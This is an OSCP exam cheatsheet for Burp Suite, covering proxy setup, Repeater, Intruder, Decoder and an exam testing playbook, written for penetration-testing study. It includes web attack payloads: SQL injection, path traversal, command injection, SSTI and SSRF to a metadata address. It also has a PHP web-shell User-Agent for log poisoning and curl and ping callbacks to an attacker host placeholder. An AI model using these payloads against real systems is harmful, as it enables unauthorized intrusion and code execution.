# Burp Suite - OSCP Cheatsheet

> **Methodology and Cheatsheet Cross-References**:
> - Web Attack Methodology: [[02-Web-Attack|02 - Web Attack Methodology]]
> - Web Fuzzing Cheatsheet: [[🟣 gobuster-ffuf]]
> - SQL Injection Cheatsheet: [[💉 sql-injection]]
> - Pivoting and Tunneling: [[06-Pivoting-Directory|06 - Pivoting Methodology]] | [[🔀 ligolo-chisel]]

---

## Navigation Triage Matrix

| Operational Goal | Technique / Feature | Quick Link |
|---|---|---|
| Configure target scope and proxy listener | Proxy and Scope Setup | [[#1. Proxy and Scope Configuration]] |
| Install Burp CA certificate in Firefox / Linux | CA Certificate Setup | [[#2. CA Certificate and Browser Setup]] |
| Intercept and inspect live HTTP/S traffic | Intercept and HTTP History | [[#3. Proxy Intercept and HTTP History]] |
| Modify and re-send individual requests | Repeater Workflow | [[#4. Repeater - Manual Testing Workflow]] |
| Fuzz parameters, brute-force logins, or scrape IDORs | Intruder Fuzzing | [[#5. Intruder - Rate-Limited Fuzzing]] |
| Encode, decode, and hash data on the fly | Decoder Transforms | [[#6. Decoder - Quick Transforms and Hashes]] |
| Compare baseline vs payload responses (diff) | Comparer Diffing | [[#7. Comparer - Response Diffing]] |
| Map attack surface and filter out-of-scope noise | Target Site Map | [[#8. Target Site Map and Scope Filtering]] |
| Automatically modify headers, cookies, or bodies | Match and Replace Rules | [[#9. Match and Replace Rules]] |
| Route Burp traffic through a pivot tunnel (Ligolo/Chisel) | SOCKS Proxy Chaining | [[#10. SOCKS Proxy Chaining (Pivoting)]] |
| Handle blind vulnerabilities without Collaborator | OSCP Policy and Workarounds | [[#11. OSCP Exam Restrictions and Workarounds]] |
| Convert Burp requests to bash/python CLI commands | Copy as cURL | [[#12. Copy as cURL and Python Automation]] |
| Maximize speed in the Burp UI | Keyboard Shortcuts | [[#13. Essential Keyboard Shortcuts]] |
| Systematic step-by-step exam target execution | OSCP Testing Playbook | [[#14. OSCP Exam Web Testing Playbook]] |

---

## 1. Proxy and Scope Configuration

### Default Rules and Proxy Listener
- **The Golden Rule**: Keep `Intercept is ON` switched to `OFF` by default. Only activate Intercept when catching a specific, non-repeatable request (e.g., token submission). Leaving Intercept on will freeze browser rendering.
- **Default Listener**: Burp listens on `127.0.0.1:8080`. Verify under `Proxy` -> `Proxy settings` -> `Proxy listeners`.
- **FoxyProxy Setup**:
  1. Add a new proxy in FoxyProxy: Title `Burp`, Host `127.0.0.1`, Port `8080`.
  2. Toggle between `Burp` and `Turn Off (Use System Settings)` as needed.

### Target Scope Definition (Mandatory for OSCP)
Defining target scope prevents background browser noise (telemetry, updates, external assets) from clogging your HTTP history:
1. Navigate to `Target` -> `Scope settings`.
2. Check `Use advanced scope control` (optional, for regex) or click `Add` under `Include in scope`.
3. Enter target URL prefix: `http://[TARGET_IP]` and `https://[TARGET_IP]`.
4. Go to `Proxy` -> `HTTP history`, click the filter bar at the top, and check **Show only in-scope items**.
5. Result: Only requests destined for your assigned lab/exam machine will appear in your proxy log.

### Burp Embedded Chromium Browser
- Path: `Proxy` -> `Intercept` -> `Open Browser`.
- Launches a sandboxed Chromium instance pre-configured with Burp proxy settings and trusted CA certificates.
- Useful for quick tests where you do not want to reconfigure Firefox or when testing browser-specific behaviors.

---

## 2. CA Certificate and Browser Setup

To intercept HTTPS traffic without TLS certificate warnings in Firefox:

### Download and Install the Certificate
1. Start Burp Suite and verify the proxy listener is active on `127.0.0.1:8080`.
2. In Firefox (with FoxyProxy pointing to Burp), navigate to:
   ```text
   http://burp
   ```
   Or directly download from:
   ```text
   http://127.0.0.1:8080/cert
   ```
3. Save the certificate file as `cacert.der`.
4. In Firefox:
   - Navigate to `Settings` -> `Privacy & Security` -> `Certificates` -> click `View Certificates...`.
   - Under the `Authorities` tab, click `Import...`.
   - Select `cacert.der`.
   - Check the box: `Trust this CA to identify websites`.
   - Click `OK`.

---

## 3. Proxy Intercept and HTTP History

### Request Interception Workflow
1. Navigate to `Proxy` -> `Intercept`.
2. Toggle `Intercept is off` to `Intercept is on`.
3. Submit the web action in your browser.
4. The raw HTTP request appears in the editor before leaving your system.
5. Edit parameters, HTTP headers, cookies, or verbs directly.
6. Click `Forward` to transmit the modified request, or `Drop` to discard it.

### High-Yield Intercept Scenarios
- **Client-Side Validation Bypass**: Modify disabled fields, file upload MIME types (`Content-Type: image/png` with a PHP payload), or hidden price/role values.
- **Header Injection**: Inject `X-Forwarded-For: 127.0.0.1`, `Host: internal.local`, or custom authorization headers.
- **CSRF Token and Nonce Manipulation**: Capture single-use form tokens for manual parameter tampering.

### HTTP History Analysis
- Path: `Proxy` -> `HTTP history`.
- Passive capture of every request/response passing through the proxy.
- **Key Actions**:
  - `Ctrl + R`: Send selected request directly to Repeater.
  - `Ctrl + I`: Send selected request directly to Intruder.
  - Search bar: Filter by strings such as `admin`, `api`, `token`, `password`, `upload`.
  - Column sorting: Sort by `Status` (spot 302/500 errors), `Length` (spot response variances), or `MIME type`.

### Intercepting Server Responses
1. Navigate to `Proxy` -> `Proxy settings` -> `Response interception rules`.
2. Check the box: `Intercept responses based on the following rules`.
3. Add a rule or use the default (e.g., intercept if `Content-Type` contains `text/html` or `application/json`).
4. **Use Case**: Flip server responses such as `{"authenticated": false, "isAdmin": false}` to `{"authenticated": true, "isAdmin": true}` to defeat client-side routing guards.

---

## 4. Repeater - Manual Testing Workflow

> 💡 *Repeater is the core tool for OSCP web exploitation. You will conduct roughly 90% of your web payload iteration here.*

### Standard Repeater Workflow
1. Locate target request in `HTTP history` or `Intercept`.
2. Press `Ctrl + R` to send to Repeater.
3. Switch to the `Repeater` tab (`Ctrl + Shift + R` or click).
4. Rename the tab (double-click tab header) to track the vector (e.g., `SQLi-Login`, `LFI-Param`, `SSTI-Name`).
5. Modify request headers, payload, or method.
6. Press `Ctrl + Space` (or click `Send`) to execute.
7. Inspect the response panel (Render, Raw, Hex, or Pretty).

### OSCP Attack Scenarios in Repeater

| Vulnerability Class | Request Manipulation | Key Verification Pattern |
|---|---|---|
| **SQL Injection** | Inject `' OR 1=1 -- -` or `' UNION SELECT NULL,@@version-- -` | Check database error strings, login bypass, or reflected version string |
| **LFI / Path Traversal** | Replace path with `../../../../etc/passwd` or `..\..\..\windows\win.ini` | Search response for `root:x:0:0` or `[extensions]` |
| **PHP Wrappers** | `page=php://filter/convert.base64-encode/resource=index.php` | Extract base64 blob and decode in Decoder tab |
| **Command Injection** | Append `; whoami` or `| id` or `$(whoami)` to input fields | Inspect response body for user ID or command output |
| **SSTI** | Inject `{{7*7}}` or `${7*7}` or `<%= 7*7 %>` | Check for arithmetic evaluation (`49`) in rendered output |
| **SSRF** | Modify URL parameter to `http://127.0.0.1:80/admin` or `http://169.254.169.254/` | Check for local administration interfaces or cloud metadata |
| **IDOR** | Modify numeric or GUID identifier: `GET /profile?id=2` | Compare response size and sensitive user data with baseline |
| **Verb Tampering** | Change `GET /admin` to `POST`, `PUT`, or `HEAD` | Check for authorization bypass (200 OK vs 403 Forbidden) |

### Inspector Panel
- Located on the right side of the request/response editor.
- Automatically separates Query Parameters, Body Parameters, Cookie Attributes, and Request Headers.
- Allows immediate inline URL encoding/decoding without switching tabs.

---

## 5. Intruder - Rate-Limited Fuzzing

> ⚠️ **OSCP Community Edition Constraint**:
> Burp Suite Community Edition applies artificial rate limiting (throttling) to Intruder attacks.
> - **DO NOT** use Community Intruder for large wordlists (e.g., `rockyou.txt` or `directory-list-2.3-medium.txt`).
> - **USE** [[🟣 gobuster-ffuf|ffuf or gobuster]] for heavy directory, file, and parameter fuzzing.
> - **RESERVE** Intruder for targeted small lists (< 150 items), IDOR number cycling, or multi-field spraying.

### Attack Configuration Steps
1. Send request to Intruder (`Ctrl + I`).
2. Switch to the `Positions` tab.
3. Click `Clear §` to remove automatic markers.
4. Highlight target parameter value and click `Add §` (e.g., `username=§admin§&password=§test§`).
5. Choose Attack Type:
   - **Sniper**: Cycles one wordlist through each position sequentially. Best for single-parameter fuzzing.
   - **Battering Ram**: Places identical payload in all marked positions simultaneously.
   - **Pitchfork**: Uses multiple wordlists, advancing each list together (List 1 index 0 with List 2 index 0). Ideal for matching user/password pairs.
   - **Cluster Bomb**: Full Cartesian product testing every combination across lists (List 1 * List 2). Use only with very small lists (< 20 items).

### Payload Sets and Configurations
- **Simple List**: Paste items directly or load custom targeted wordlists.
- **Numbers**: Set start, end, and step values (e.g., 1 to 200, step 1) with integer format. Ideal for IDOR enumeration.
- **Brute Forcer**: Character set and length specifications for small token testing.

### Result Analysis Filters
- **Sort by Status Code**: Look for `200` responses among `403` or `404` errors.
- **Sort by Length**: Variances in payload length frequently identify successful authentication, verbose errors, or different logic branches.
- **Grep - Match**:
  - Path: `Intruder` -> `Settings` -> `Grep - Match`.
  - Add flag strings: `Welcome`, `Logged in as`, `Invalid username`, `SQL syntax`.
  - A dedicated column will display checkboxes for matches.
- **Grep - Extract**:
  - Path: `Intruder` -> `Settings` -> `Grep - Extract`.
  - Highlight response text (e.g., CSRF tokens or user balances) to harvest extracted values directly into the result table.

---

## 6. Decoder - Quick Transforms and Hashes

Access via top navigation `Decoder` tab, or right-click any highlighted string -> `Send to Decoder`.

### Supported Transformations

| Transformation | Exam Application |
|---|---|
| **URL Encode / Decode** | Sanitize injection characters (`%20`, `%26`, `%23`) for query string delivery |
| **HTML Encode / Decode** | Encode `<script>` or special entities to test filter evasion |
| **Base64 Encode / Decode** | Decode session cookies, PHP wrapper responses, or encode reverse shell commands |
| **ASCII Hex Encode / Decode** | Decode binary streams, shellcode bytes, or SQL hex literals (`0x61646d696e`) |
| **Octal / Binary** | Handle legacy encoding schemes or specialized filter bypasses |
| **Gzip / Deflate** | Decompress HTTP response streams manually |

### Smart Decode and Hash Identification
- **Smart Decode**: Click `Smart Decode` to automatically identify and strip stacked encoding layers (e.g., Base64 nested inside URL-encoding).
- **Hash Identification**: Paste unknown hash strings into Decoder and click `Smart Decode` to determine candidate hash algorithms (MD5, SHA-1, SHA-256, NTLM).

---

## 7. Comparer - Response Diffing

Comparer visually highlights additions, deletions, and modifications between two HTTP requests or responses.

### Operational Workflow
1. Select baseline item (e.g., failed login attempt or valid ID query) -> right-click -> `Send to Comparer`.
2. Select target item (e.g., candidate exploit attempt or alternate ID query) -> right-click -> `Send to Comparer`.
3. Switch to the `Comparer` tab.
4. Select both items in the top and bottom panels.
5. Click **Words** (for text/HTML changes) or **Bytes** (for binary/length shifts).
6. Differing sections are color-coded (Modified, Added, Deleted).

### OSCP High-Yield Use Cases
- **Boolean Blind SQL Injection**: Diff `id=1 AND 1=1` against `id=1 AND 1=2` to pinpoint subtle text changes confirming injection.
- **Username Enumeration**: Compare response times and subtle error message modifications (e.g., `Incorrect password` vs `User does not exist`).
- **WAF / Filter Analysis**: Compare a stripped response against an unstripped request to observe exact filter sanitization behaviors.

---

## 8. Target Site Map and Scope Filtering

### Site Map Capabilities
- Path: `Target` -> `Site map`.
- Passively builds a directory tree of all hosts, folders, files, and query parameters observed by Burp.
- **Right-Click Context Menu**:
  - `Engagement tools` -> `Analyze target`: Summary of form fields, dynamic endpoints, and scripts.
  - `Engagement tools` -> `Discover content`: Unauthenticated spidering (Community is limited, prefer `ffuf`).
  - `Show response in browser`: Replay requests to view visual layout without running scripts manually.

---

## 9. Match and Replace Rules

Automatically modify request or response streams passing through Burp without manually pausing each request.

### Enabling Rules
- Path: `Proxy` -> `Proxy settings` -> `Match and replace rules`.
- Click `Add` to insert custom rules.

### Essential OSCP Match and Replace Profiles

| Target Stream | Match Regex / String | Replace String | Objective |
|---|---|---|---|
| **Request header** | `^User-Agent:.*$` | `User-Agent: <?php system($_GET['cmd']); ?>` | Apache/Nginx log poisoning via access log |
| **Request header** | (empty - add header) | `X-Forwarded-For: 127.0.0.1` | Bypass localhost-only IP restrictions |
| **Request header** | (empty - add header) | `X-Originating-IP: 127.0.0.1` | Secondary proxy header bypass |
| **Request body** | `isAdmin=false` | `isAdmin=true` | Parameter tampering across all automated POST traffic |
| **Response header** | `Content-Security-Policy:.*$` | (empty) | Strip CSP restrictions during client-side testing |
| **Request header** | `Accept-Encoding: gzip, deflate` | (empty) | Force server to return uncompressed plain-text responses |

---

## 10. SOCKS Proxy Chaining (Pivoting)

When testing internal web applications accessible only through a compromised dual-homed machine via Ligolo-ng, Chisel, or SSH dynamic port forwarding (`-D 1080`):

### Setting Up SOCKS Proxy in Burp
1. Navigate to `Settings` (gear icon top right) -> `Network` -> `Connections`.
2. Scroll to **SOCKS proxy**.
3. Check **Use SOCKS proxy**.
4. Configure connection parameters:
   - **SOCKS host**: `127.0.0.1`
   - **SOCKS port**: `1080` (or chosen local pivot port)
5. Check **Do DNS lookups over SOCKS proxy** (ensures internal domain names like `dc01.corp.local` resolve through the target network).
6. Result: All Burp traffic (Proxy, Repeater, Intruder) will route through your established tunnel directly into the internal segment.

---

## 11. OSCP Exam Restrictions and Workarounds

> ⚠️ **Critical OffSec Exam Policy**:
> - **Burp Suite Professional Scanner**: Prohibited on all exam targets.
> - **Burp Collaborator**: Prohibited on exam targets (uses external public cloud infrastructure).
> - **Community Edition Tools Allowed**: Proxy, Repeater, Intruder, Decoder, Comparer, Sequencer, Match/Replace.

### Testing Blind Vulnerabilities Without Burp Collaborator
When testing for Out-of-Band (OAST) vulnerabilities (Blind SSRF, Blind XXE, Blind RCE):

#### Method 1: Local HTTP Server (Kali)
Run a dedicated Python HTTP server on your Kali machine:
```bash
python3 -m http.server 80
```
Payload in Burp Repeater:
```http
POST /submit HTTP/1.1
Host: [TARGET_IP]
Content-Type: application/x-www-form-urlencoded

url=http://[KALI_IP]/test-callback
```
Monitor Kali terminal for inbound connection log:
```text
[KALI_IP] - - [Date] "GET /test-callback HTTP/1.1" 200 -
```

#### Method 2: Netcat Callback Listener
```bash
nc -lvnp 4444
```
Payload (Command Injection / SSRF):
```text
; curl http://[KALI_IP]:4444/callback
```

#### Method 3: TCPDump ICMP Monitoring
```bash
sudo tcpdump -i tun0 icmp
```
Payload:
```text
; ping -c 3 [KALI_IP]
```

---

## 12. Copy as cURL and Python Automation

Convert any request inside Burp Repeater into an external script or terminal command:

### Copy as cURL
1. Right-click anywhere inside the request editor in Repeater or HTTP History.
2. Select **Copy as cURL (bash)** or **Copy as cURL (cmd)**.
3. Paste directly into your Kali terminal:
   ```bash
   curl -i -s -k -X $'POST'        -H $'Host: [TARGET_IP]'        -H $'Content-Type: application/x-www-form-urlencoded'        --data-binary $'username=admin&password=test'        $'http://[TARGET_IP]/login.php'
   ```

### Scripting with Python Requests
Easily port Burp cURL requests into reproducible Python scripts:
```python
import requests

url = "http://[TARGET_IP]/login.php"
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {
    "username": "admin' OR 1=1 -- -",
    "password": "dummy"
}
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# verify=False disables SSL verification; proxies routes traffic through Burp
r = requests.post(url, headers=headers, data=data, proxies=proxies, verify=False)
print(f"Status: {r.status_code}")
print(f"Length: {len(r.text)}")
```

---

## 13. Essential Keyboard Shortcuts

| Shortcut | Context | Action |
|---|---|---|
| `Ctrl + R` | Global / Proxy / Intruder | Send current request to Repeater |
| `Ctrl + I` | Global / Proxy / Repeater | Send current request to Intruder |
| `Ctrl + Space` | Repeater | Send active request immediately |
| `Ctrl + Shift + R` | Global | Switch to Repeater tab |
| `Ctrl + Shift + P` | Global | Switch to Proxy tab |
| `Ctrl + Shift + I` | Global | Switch to Intruder tab |
| `Ctrl + U` | Request / Repeater Editor | URL-encode selected string |
| `Ctrl + Shift + U` | Request / Repeater Editor | URL-decode selected string |
| `Ctrl + B` | Request / Repeater Editor | Base64-encode selected string |
| `Ctrl + Shift + B` | Request / Repeater Editor | Base64-decode selected string |
| `Ctrl + F` | Any Editor Panel | Open find / search dialog |
| `Ctrl + Z` | Editor Panel | Undo previous text modification |

---

## 14. OSCP Exam Web Testing Playbook

Follow this standardized 5-stage procedure for every web application encountered on the exam:

```text
[Phase 1: Setup]  --> Configure Target Scope -> Filter HTTP History -> Verify Browser Proxy
         │
[Phase 2: Recon]  --> Browse App Manually -> Review Site Map -> Extract Hidden Forms/Parameters
         │
[Phase 3: Fuzz]   --> Discover Hidden Routes with ffuf -> Send Suspicious Endpoints to Burp
         │
[Phase 4: Attack] --> Send to Repeater -> Iterate SQLi / LFI / SSTI / Command Injection
         │
[Phase 5: Record] --> Screenshot Request + Response Pair -> Copy Raw Text to Exam Documentation
```

### Stage 1: Setup (First 2 Minutes)
1. Add target IP (`http://[TARGET_IP]`) to `Target` -> `Scope settings`.
2. In `Proxy` -> `HTTP history`, activate **Show only in-scope items**.
3. Confirm `Intercept is off`.
4. Browse to target application in Firefox with FoxyProxy enabled.

### Stage 2: Passive Reconnaissance
1. Click through every visible link, tab, login form, and register page.
2. Submit dummy credentials (e.g., `admin:admin`) to capture form parameters.
3. Review `Target` -> `Site map` to inspect unlinked scripts, CSS endpoints, and API directories.
4. Review `Proxy` -> `HTTP history` sorting by size and status code.

### Stage 3: Active Parameter Testing (Repeater-First)
1. Identify high-value request parameters (search fields, login forms, file loaders, profile IDs).
2. Send request to Repeater (`Ctrl + R`).
3. Systematically test primary vectors:
   - Input `'` or `"` -> check for syntax errors (SQLi).
   - Input `../../../../etc/passwd` -> check for local file inclusion.
   - Input `${7*7}` or `{{7*7}}` -> check for template evaluation.
   - Input `; whoami` or `| id` -> check for command execution.
4. Iterate until full RCE or authenticated session is attained.

### Stage 4: Targeted Automation (Intruder)
1. If parameter requires cycling small lists (e.g., user enumeration or IDOR sequential IDs):
   - Send to Intruder (`Ctrl + I`).
   - Define exact position with `§`.
   - Use Numbers payload (1-100) or short targeted user list.
   - Set Grep-Match to isolate successful response signatures.
2. Return back to Repeater with discovered valid values to proceed.

### Stage 5: Evidence Preservation
1. Preserve every winning request/response pair in a dedicated named Repeater tab.
2. Take full-window screenshots showing URL, request headers, payload, and response text.
3. Right-click -> `Copy as cURL` to archive the exact reproduction string in your exam notes.
